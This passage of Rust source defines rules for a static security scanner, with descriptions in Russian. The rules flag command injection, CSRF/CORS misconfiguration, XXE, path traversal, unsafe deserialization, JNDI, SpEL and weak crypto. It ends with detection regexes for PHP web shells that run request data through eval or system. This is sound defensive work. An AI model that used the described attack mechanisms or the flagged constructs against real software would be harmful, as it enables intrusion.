        description: "open(\"| cmd\") запускает команду ОС, а open(params[...]) читает произвольный путь или URL. Первое даёт инъекцию команд, второе — чтение файлов/SSRF.",
        recommendation: "Используйте File.open для файлов и URI.open только с проверенным адресом; не передавайте ввод в Kernel#open.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Ruby],
        pattern: r#"\bopen\s*\(\s*(?:["']\s*\||params\b)"#,
        unless_contains: &["File.open", "URI.open"],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-EX-004",
        title: "String.to_atom на пользовательских данных",
        description: "String.to_atom создаёт атом из строки. Атомы не собираются сборщиком мусора: поток разных значений извне исчерпывает таблицу атомов и роняет узел BEAM.",
        recommendation: "Используйте String.to_existing_atom, если набор атомов заранее известен.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Отказ в обслуживании",
        languages: &[Language::Elixir],
        pattern: r"String\.to_atom\s*\(",
        unless_contains: &[],
        cwe: &["CWE-400"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/400.html"],
        skip_in_tests: false,
    },

    // ----------------------------- Веб-фреймворки: CSRF, CORS, XXE, JWT, hosts
    Rule {
        id: "VS-PY-034",
        title: "Django: защита CSRF отключена (@csrf_exempt)",
        description: "@csrf_exempt снимает проверку CSRF-токена с представления. Форму или API можно вызвать с чужого сайта от имени залогиненного пользователя.",
        recommendation: "Не отключайте CSRF для операций, меняющих состояние. Для API используйте токен-аутентификацию, а не сессионные куки.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: PY,
        pattern: r"@csrf_exempt\b",
        unless_contains: &[],
        cwe: &["CWE-352"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/352.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-035",
        title: "Django: ALLOWED_HOSTS = ['*']",
        description: "ALLOWED_HOSTS = ['*'] принимает запросы с любым заголовком Host. Это открывает подмену Host-заголовка: отравление ссылок сброса пароля и кэша.",
        recommendation: "Перечислите конкретные домены в ALLOWED_HOSTS.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: PY,
        pattern: r#"ALLOWED_HOSTS\s*=\s*\[[^\]]*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-16"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.djangoproject.com/en/stable/ref/settings/#allowed-hosts"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-036",
        title: "CORS разрешён для любого источника",
        description: "flask-cors с origins=\"*\" (или голый CORS(app)) отдаёт Access-Control-Allow-Origin: * для всех маршрутов. Любой сайт может обращаться к API из браузера жертвы.",
        recommendation: "Задайте явный список доверенных источников вместо \"*\", особенно если используются куки/креденшелы.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: PY,
        pattern: r#"origins\s*=\s*["']\*["']|CORS\s*\(\s*app\s*\)"#,
        unless_contains: &[],
        cwe: &["CWE-942"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-034",
        title: "CORS разрешён для любого источника",
        description: "Access-Control-Allow-Origin: * или cors({ origin: \"*\" }) открывает API любому сайту. В связке с куками или credentials это позволяет чужой странице действовать от имени пользователя.",
        recommendation: "Укажите конкретный список доверенных источников; не сочетайте \"*\" с credentials.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: JS_FAMILY,
        pattern: r#"Access-Control-Allow-Origin["'\s,]+["']\*["']|origin\s*:\s*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-942"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-029",
        title: "Spring @CrossOrigin без ограничения источника",
        description: "@CrossOrigin() без аргументов или с origins = \"*\" разрешает кросс-доменные запросы с любого сайта. Это ослабляет same-origin policy для аннотированного контроллера.",
        recommendation: "Перечислите доверенные источники: @CrossOrigin(origins = {\"https://app.example.com\"}).",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"@CrossOrigin\s*(?:\(\s*\)|\([^)]*"\*")"#,
        unless_contains: &[],
        cwe: &["CWE-942"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-013",
        title: "JWT подписан алгоритмом none",
        description: "SigningMethodNone/UnsafeAllowNoneSignatureType выпускает или принимает JWT без подписи. Атакующий подделывает любой токен, просто убрав подпись.",
        recommendation: "Подписывайте и проверяйте токены сильным алгоритмом (HS256/RS256) и явно запрещайте none при разборе.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Аутентификация",
        languages: &[Language::Go],
        pattern: r"SigningMethodNone|UnsafeAllowNoneSignatureType",
        unless_contains: &[],
        cwe: &["CWE-347"],
        owasp: Some(OWASP_AUTH),
        references: &["https://cwe.mitre.org/data/definitions/347.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-012",
        title: "CORS: AllowAnyOrigin()",
        description: "AllowAnyOrigin() в политике CORS ASP.NET Core разрешает запросы с любого сайта. С AllowCredentials это даёт чужой странице действовать от имени пользователя.",
        recommendation: "Используйте WithOrigins(\"https://app.example.com\") со списком доверенных источников.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::CSharp],
        pattern: r"\.AllowAnyOrigin\s*\(",
        unless_contains: &[],
        cwe: &["CWE-942"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-013",
        title: "Разбор XML уязвим к XXE",
        description: "DtdProcessing.Parse или назначенный XmlResolver заставляют .NET разбирать DTD и внешние сущности. XML со ссылкой на файл или URL раскрывает содержимое и бьёт по SSRF.",
        recommendation: "Задайте DtdProcessing = DtdProcessing.Prohibit и XmlResolver = null у XmlReaderSettings.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "XXE",
        languages: &[Language::CSharp],
        pattern: r"DtdProcessing\s*\.\s*Parse|XmlResolver\s*=\s*new\s+Xml",
        unless_contains: &[],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-016",
        title: "Разбор XML с подстановкой внешних сущностей (LIBXML_NOENT)",
        description: "Флаг LIBXML_NOENT включает подстановку внешних сущностей при разборе XML. Документ со ссылкой на файл или URL приводит к чтению локальных файлов и SSRF (XXE).",
        recommendation: "Не используйте LIBXML_NOENT для недоверенного XML. На PHP < 8 вызовите libxml_disable_entity_loader(true).",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "XXE",
        languages: &[Language::Php],
        pattern: r"\bLIBXML_NOENT\b",
        unless_contains: &[],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-011",
        title: "Rails: защита CSRF отключена",
        description: "skip_before_action :verify_authenticity_token или protect_from_forgery with: :null_session снимает проверку CSRF. Меняющие состояние запросы проходят с чужого сайта.",
        recommendation: "Не отключайте verify_authenticity_token для форм и state-changing действий; для API используйте токен-аутентификацию.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Ruby],
        pattern: r"skip_before_action\s+:verify_authenticity_token|protect_from_forgery\s+with:\s*:null_session",
        unless_contains: &[],
        cwe: &["CWE-352"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/352.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-012",
        title: "Path traversal: файл отдаётся по пути из params",
        description: "send_file или File.read/open с params[...] отдаёт файл по имени, которое задаёт пользователь. Через ../ он выходит за пределы каталога и читает произвольные файлы.",
        recommendation: "Сопоставляйте запрошенное имя с белым списком или берите только basename и фиксируйте базовый каталог.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: &[Language::Ruby],
        pattern: r"(?:send_file|File\.(?:read|open)|render\s+file:)\s*\(?\s*params\b",
        unless_contains: &[],
        cwe: &["CWE-22"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/22.html"],
        skip_in_tests: false,
    },

    // ------------------ Динамический код, небезопасная рефлексия, path traversal
    Rule {
        id: "VS-PH-014",
        title: "create_function() — динамический код",
        description: "create_function() компилирует переданную строку тела как код PHP — это eval с другого входа. Если в тело попадает ввод, атакующий исполняет произвольный код.",
        recommendation: "Уберите create_function() (удалён в PHP 8). Используйте обычные анонимные функции (замыкания).",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Выполнение кода",
        languages: &[Language::Php],
        pattern: r"\bcreate_function\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-015",
        title: "parse_str() без второго аргумента засоряет область видимости",
        description: "parse_str() с одним аргументом создаёт переменные из строки запроса прямо в текущей области — как register_globals. Атакующий переопределяет любые переменные через query string.",
        recommendation: "Всегда передавайте второй аргумент-массив: parse_str($input, $result) и работайте с $result.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Php],
        pattern: r"\bparse_str\s*\(\s*[^,)]+\)",
        unless_contains: &[],
        cwe: &["CWE-621"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/621.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-025",
        title: "Небезопасная рефлексия: Class.forName по переменной",
        description: "Class.forName() с именем класса из переменной позволяет атакующему загрузить и инстанцировать произвольный класс. В связке с гаджетами это ведёт к выполнению кода.",
        recommendation: "Не берите имя класса из ввода. Сопоставьте разрешённые значения белым списком или фабрикой с фиксированным набором типов.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Небезопасная рефлексия",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"Class\.forName\s*\(\s*[a-zA-Z_]\w*\s*[),]",
        unless_contains: &[],
        cwe: &["CWE-470"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/470.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-010",
        title: "Небезопасная рефлексия: constantize / const_get",
        description: "constantize и const_get превращают строку в константу (класс). Со строкой из params атакующий получает доступ к произвольному классу и его методам — обход логики и иногда выполнение кода.",
        recommendation: "Не вызывайте constantize на пользовательском вводе. Сопоставьте допустимые значения явным белым списком (хэшом строка → класс).",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Небезопасная рефлексия",
        languages: &[Language::Ruby],
        pattern: r"\.constantize\b|\.const_get\s*\(",
        unless_contains: &[],
        cwe: &["CWE-470"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/470.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-011",
        title: "Path traversal: ServeFile по пути из запроса",
        description: "http.ServeFile с путём из r.URL отдаёт файл по имени, которое задаёт клиент. Через ../ пользователь выходит за пределы каталога и читает произвольные файлы.",
        recommendation: "ServeFile сам предупреждает об этом: очистите путь через filepath.Clean и проверьте, что он внутри разрешённого каталога, либо используйте http.FileServer с http.Dir.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: &[Language::Go],
        pattern: r"http\.ServeFile\s*\([^)]*r\.URL",
        unless_contains: &[],
        cwe: &["CWE-22"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/22.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-012",
        title: "Path traversal: путь собран из данных запроса",
        description: "filepath.Join с сегментом из запроса (r.URL, r.FormValue) даёт клиенту влиять на путь. filepath.Join не защищает от ../ — файл может оказаться вне каталога.",
        recommendation: "После Join проверьте, что результат под нужным корнем (strings.HasPrefix по filepath.Clean), или сопоставляйте имя с белым списком.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: &[Language::Go],
        pattern: r"filepath\.Join\s*\([^)]*\br\.(?:URL|FormValue|PostFormValue|Form)\b",
        unless_contains: &[],
        cwe: &["CWE-22"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/22.html"],
        skip_in_tests: false,
    },

    // ------------------------ Громкие RCE-гаджеты: десериализация, JNDI, eval
    Rule {
        id: "VS-JV-021",
        title: "Jackson: полиморфная десериализация включена",
        description: "enableDefaultTyping()/activateDefaultTyping() заставляет Jackson читать имя класса из JSON и создавать его. Атакующий подсовывает гаджет-класс и получает выполнение кода — классическая цепочка Jackson RCE.",
        recommendation: "Не включайте default typing. Если полиморфизм нужен — используйте @JsonTypeInfo с явным белым списком через PolymorphicTypeValidator.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"(?:enableDefaultTyping|activateDefaultTyping)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-022",
        title: "JNDI-поиск по управляемому имени",
        description: "Context.lookup() с переменной или собранной строкой позволяет указать удалённый LDAP/RMI-адрес. Сервер загрузит и выполнит класс оттуда — тот самый механизм, что стоит за Log4Shell.",
        recommendation: "Не подставляйте ввод в JNDI-имя. Ограничьте поиск локальным java:comp/env со статическими именами; отключите удалённую загрузку классов.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"\.lookup\s*\(\s*(?:[a-zA-Z_]\w*\s*\)|"[^"]*"\s*\+)"#,
        unless_contains: &[],
        cwe: &["CWE-74"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/74.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-023",
        title: "Выполнение кода через ScriptEngine/Groovy",
        description: "ScriptEngine (Nashorn) или GroovyShell исполняют переданный текст как скрипт с полным доступом к JVM. Если в него попадает ввод — это выполнение произвольного кода на сервере.",
        recommendation: "Не исполняйте пользовательский текст как скрипт. Если нужен сценарий — используйте песочницу (SecureASTCustomizer у Groovy) и белый список.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"getEngineByName\s*\(|new\s+GroovyShell\s*\(|new\s+GroovyClassLoader\s*\(",
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-024",
        title: "Десериализация через XStream",
        description: "XStream.fromXML() без настройки безопасности воссоздаёт произвольные объекты из XML и вызывает их методы. Недоверенный XML даёт выполнение кода — известная цепочка гаджетов XStream.",
        recommendation: "Обновите XStream и включите защиту: XStream.setupDefaultSecurity(x) плюс явный allowTypes для нужных классов.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Небезопасная десериализация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"\.fromXML\s*\(",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-011",
        title: "Json.NET: TypeNameHandling не None",
        description: "TypeNameHandling.All/Auto/Objects заставляет Json.NET читать имя типа ($type) из JSON и создавать его. Атакующий подставляет гаджет-тип и получает выполнение кода при десериализации.",
        recommendation: "Держите TypeNameHandling = None. Если полиморфизм необходим — задайте строгий SerializationBinder с белым списком типов.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::CSharp],
        pattern: r"TypeNameHandling\s*\.\s*(?:All|Auto|Objects|Arrays)",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },

    // -------------------- Прототип, postMessage, SpEL, XXE, секреты, тайминг
    Rule {
        id: "VS-JS-032",
        title: "Загрязнение прототипа (запись в __proto__)",
        description: "Присваивание в __proto__ или constructor.prototype меняет прототип всех объектов сразу. Через управляемый ключ атакующий подсовывает свойства, которые всплывают везде, — обход проверок, порча логики, иногда RCE.",
        recommendation: "Не пишите в __proto__/prototype по вычисляемому ключу. Отклоняйте ключи __proto__, constructor, prototype; используйте Map или Object.create(null).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Загрязнение прототипа",
        languages: JS_FAMILY,
        pattern: r#"(?:\.__proto__|\.constructor\.prototype|\[\s*["'`]__proto__["'`]\s*\])(?:\.\w+|\[[^\]]+\])*\s*=[^=]"#,
        unless_contains: &[],
        cwe: &["CWE-1321"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/1321.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-033",
        title: "postMessage с origin \"*\"",
        description: "postMessage(data, \"*\") отправляет сообщение в любое окно на любом источнике. Если во фрейме окажется чужая страница, она прочитает данные. Так утекают токены и персональные данные.",
        recommendation: "Указывайте конкретный целевой origin вместо \"*\", а на приёмной стороне проверяйте event.origin.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Утечка данных",
        languages: JS_FAMILY,
        pattern: r#"\.postMessage\s*\([^,]*,\s*["'`]\*["'`]\s*\)"#,
        unless_contains: &[],
        cwe: &["CWE-345"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/345.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-018",
        title: "SpEL-инъекция: выражение из пользовательских данных",
        description: "parseExpression() с собранной или переменной строкой компилирует и исполняет Spring EL — а через него любой код Java. Это выполнение кода на сервере из ввода.",
        recommendation: "Не собирайте SpEL из ввода. Используйте SimpleEvaluationContext и статические выражения; данные передавайте как переменные.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"parseExpression\s*\(\s*(?:"[^"]*"\s*\+|[a-zA-Z_]\w*\s*[),])"#,
        unless_contains: &[],
        cwe: &["CWE-917"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/917.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-019",
        title: "XML-фабрика без защиты от XXE",
        description: "DocumentBuilderFactory/SAXParserFactory/XMLInputFactory по умолчанию разбирают внешние сущности (DTD). Если внешние сущности не отключены, XML с ссылкой на файл или URL раскрывает содержимое или бьёт по SSRF.",
        recommendation: "Отключите DTD: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) и внешние сущности перед разбором.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XXE",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"(?:DocumentBuilderFactory|SAXParserFactory|XMLInputFactory)\.newInstance\s*\(",
        unless_contains: &["disallow-doctype-decl", "setExpandEntityReferences(false)"],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-020",
        title: "Десериализация через XMLDecoder",
        description: "java.beans.XMLDecoder исполняет инструкции из XML при разборе — создаёт объекты и вызывает методы. XML из недоверенного источника даёт выполнение произвольного кода; это известный RCE-гаджет.",
        recommendation: "Не разбирайте недоверенный XML через XMLDecoder. Возьмите безопасный формат (JSON со схемой) или whitelisting-десериализатор.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"new\s+XMLDecoder\s*\(",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-032",
        title: "SECRET_KEY зашит в код",
        description: "Строковый литерал в SECRET_KEY (Django/Flask) — это ключ подписи сессий и CSRF-токенов прямо в исходнике. Зная его, атакующий подделает сессию и войдёт кем угодно.",
        recommendation: "Читайте SECRET_KEY из окружения или хранилища секретов (os.environ[\"SECRET_KEY\"]). Утёкший ключ смените.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Хранение секретов",
        languages: PY,
        pattern: r#"SECRET_KEY\s*=\s*["'][^"']{8,}["']"#,
        unless_contains: &["os.environ", "getenv", "config(", "env("],
        cwe: &["CWE-798"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/798.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-033",
        title: "Сравнение дайджестов не за постоянное время",
        description: "Сравнение хеша/HMAC обычным == выходит из цикла на первом несовпавшем байте. По времени ответа атакующий побайтово подбирает правильную подпись (timing attack).",
        recommendation: "Сравнивайте секреты через hmac.compare_digest(a, b) — оно работает за постоянное время.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: PY,
        pattern: r#"\.(?:hex)?digest\(\)\s*==|==\s*\w[\w.]*\.(?:hex)?digest\(\)"#,
        unless_contains: &["compare_digest"],
        cwe: &["CWE-208"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/208.html"],
        skip_in_tests: false,
    },

    // ----------------------------------- Крипто, LDAP/XPath, mass assignment
    Rule {
        id: "VS-JV-014",
        title: "Фиксированный (нулевой) IV для шифрования",
        description: "new IvParameterSpec(new byte[...]) даёт вектор инициализации из нулей — один и тот же для каждого сообщения. В CBC/CTR это раскрывает совпадения открытого текста и ломает семантическую стойкость.",
        recommendation: "Генерируйте случайный IV на каждое сообщение через SecureRandom и передавайте его рядом с шифротекстом.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"new\s+IvParameterSpec\s*\(\s*new\s+byte\s*\[",
        unless_contains: &[],
        cwe: &["CWE-329", "CWE-1204"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/329.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-015",
        title: "Ключ шифрования зашит в код",
        description: "new SecretKeySpec(\"...\".getBytes()) берёт ключ из строкового литерала. Ключ в исходнике доступен всем, у кого есть код, и остаётся в истории git.",
        recommendation: "Держите ключ вне кода: в переменной окружения, хранилище секретов или KMS. Скомпрометированный ключ смените.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"new\s+SecretKeySpec\s*\(\s*"[^"]+"\s*\.getBytes"#,
        unless_contains: &[],
        cwe: &["CWE-321"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/321.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-016",
        title: "LDAP-инъекция: фильтр собирается конкатенацией",
        description: "Склейка пользовательского ввода в LDAP-фильтр («(uid=» + name) позволяет атакующему дописать свои условия — обойти аутентификацию или вытащить лишние записи.",
        recommendation: "Экранируйте ввод по RFC 4515 (спецсимволы \\ * ( ) NUL) или используйте параметризованные фильтры библиотеки.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "LDAP-инъекция",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"(?i)"\(\s*\w+\s*=[^"]*"\s*\+"#,
        unless_contains: &[],
        cwe: &["CWE-90"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/90.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-017",
        title: "XPath-инъекция: выражение собирается конкатенацией",
        description: "Склейка ввода в XPath (\"/users/user[name='\" + name) позволяет изменить структуру запроса и обойти проверку — например, вернуть чужого пользователя.",
        recommendation: "Используйте XPath с переменными (XPathVariableResolver) вместо конкатенации, либо экранируйте ввод.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "XPath-инъекция",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"(?i)(?:evaluate|compile|selectNodes|selectSingleNode)\s*\(\s*"[^"]*/[^"]*"\s*\+"#,
        unless_contains: &[],
        cwe: &["CWE-643"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/643.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CS-010",
        title: "Шифрование в режиме ECB",
        description: "CipherMode.ECB шифрует одинаковые блоки одинаково, поэтому структура открытого текста просвечивает в шифротексте.",
        recommendation: "Используйте AES-GCM (AesGcm) или CBC со случайным IV на каждое сообщение.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::CSharp],
        pattern: r"CipherMode\.ECB\b",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-030",
        title: "Шифрование в режиме ECB",
        description: "MODE_ECB шифрует одинаковые блоки одинаково, поэтому структура открытого текста видна в шифротексте.",
        recommendation: "Используйте AES-GCM или CBC со случайным IV на каждое сообщение (Crypto.Cipher.AES с MODE_GCM).",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: PY,
        pattern: r"\bMODE_ECB\b",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-031",
        title: "LDAP-инъекция: фильтр собирается конкатенацией",
        description: "Подстановка ввода в LDAP-фильтр («(uid=» + name или f-строкой) позволяет дописать свои условия и обойти аутентификацию или прочитать лишние записи.",
        recommendation: "Экранируйте ввод через ldap.filter.escape_filter_chars() перед вставкой в фильтр.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "LDAP-инъекция",
        languages: PY,
        pattern: r#"(?i)"\(\s*\w+\s*=[^"]*"\s*(?:\+|%)|f"\(\s*\w+\s*=[^"]*\{"#,
        unless_contains: &[],
        cwe: &["CWE-90"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/90.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-008",
        title: "Mass assignment: массовое присваивание из params",
        description: "permit! или update_attributes(params) присваивает модели все поля из запроса. Атакующий может выставить те, что не предназначались для правки — например, admin=true.",
        recommendation: "Разрешайте только нужные поля явным списком: params.require(:user).permit(:name, :email).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Ruby],
        pattern: r#"\.permit!|(?:update_attributes|update|create)\s*\(\s*params\s*\)"#,
        unless_contains: &[".permit("],
        cwe: &["CWE-915"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/915.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RB-009",
        title: "SSTI: ERB-шаблон из пользовательских данных",
        description: "ERB.new с данными из params/request компилирует и исполняет их как шаблон — а значит, как код Ruby. Это инъекция шаблона с выполнением кода на сервере.",
        recommendation: "Не собирайте шаблон из ввода. Рендерите статические шаблоны и передавайте данные через локальные переменные.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Ruby],
        pattern: r#"ERB\.new\s*\(\s*(?:params|request|@?\w*(?:input|user|body|content))"#,
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------ Индикаторы компрометации
    // These are not "risky patterns" — they are what an attacker plants. A live
    // web shell or a reverse shell in the tree means the box is already owned, so
    // they are Critical with high confidence: legitimate code essentially never
    // does this, and a false negative here is far worse than a rare false alarm.
    Rule {
        id: "VS-PH-011",
        title: "Веб-шелл: выполнение данных запроса",
        description: "eval/system/exec/shell_exec поверх $_GET/$_POST/$_REQUEST — это команда «выполни то, что я пришлю». Классический веб-шелл: сервер уже под контролем атакующего.",
        recommendation: "Удалите файл и считайте сервер скомпрометированным: смените пароли и ключи, проверьте логи и остальные файлы на закладки.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::Php],
        pattern: r#"(?i)\b(?:eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(\s*(?:stripslashes\s*\(\s*)?\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\b"#,
